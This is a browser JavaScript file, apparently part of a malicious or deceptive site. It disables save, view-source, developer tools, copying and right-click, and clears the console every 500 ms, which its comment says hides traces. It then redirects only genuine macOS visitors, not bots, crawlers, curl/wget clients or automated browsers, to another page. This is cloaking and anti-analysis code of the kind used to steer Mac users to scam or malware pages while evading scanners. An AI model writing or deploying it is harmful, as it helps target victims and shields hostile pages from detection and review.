
// protection.js
(function() {
    // ============================================
    // 1. ЗАЩИТА ОТ СКАЧИВАНИЯ СТРАНИЦЫ
    // ============================================
    
    // Блокировка Ctrl+S / Cmd+S
    document.addEventListener('keydown', function(e) {
        if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'S')) {
            e.preventDefault();
            return false;
        }
        // Блокировка Ctrl+U (просмотр исходного кода)
        if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) {
            e.preventDefault();
            return false;
        }
        // Блокировка Ctrl+P (печать)
        if ((e.ctrlKey || e.metaKey) && (e.key === 'p' || e.key === 'P')) {
            e.preventDefault();
            return false;
        }
        // Блокировка F12
        if (e.key === 'F12') {
            e.preventDefault();
            return false;
        }
        // Блокировка Ctrl+Shift+I / C / J
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'C' || e.key === 'c' || e.key === 'J' || e.key === 'j')) {
            e.preventDefault();
            return false;
        }
    });
    
    // Блокировка контекстного меню (правой кнопки мыши)
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Блокировка выделения текста
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Блокировка копирования
    document.addEventListener('copy', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Блокировка перетаскивания элементов
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Очистка консоли каждые 500 мс (чтобы скрыть следы)
    setInterval(function() {
        console.clear();
    }, 500);
    
    // ============================================
    // 2. ФИЛЬТРАЦИЯ: только macOS → редирект на offer.html
    // ============================================
    
    const ua = navigator.userAgent.toLowerCase();
    
    // Проверка на бота
    const isBot = /bot|crawler|spider|scraper|curl|wget|python|googlebot|bingbot|yandexbot|facebookexternalhit|twitterbot|slurp|duckduckbot|baiduspider|ahrefs|semrush|mj12bot|rogerbot|dotbot/i.test(ua);
    
    // Проверка на WebDriver
    const isWebDriver = navigator.webdriver === true;
    
    // Только чистая macOS (не iPhone, не iPad)
    const isPureMac = /mac/i.test(ua) && !/iphone|ipad|ipod/i.test(ua);
    
    // Редирект только для реальных пользователей на macOS
    if (!isBot && !isWebDriver && isPureMac) {
        window.location.replace("desktop.html");
    }
})();

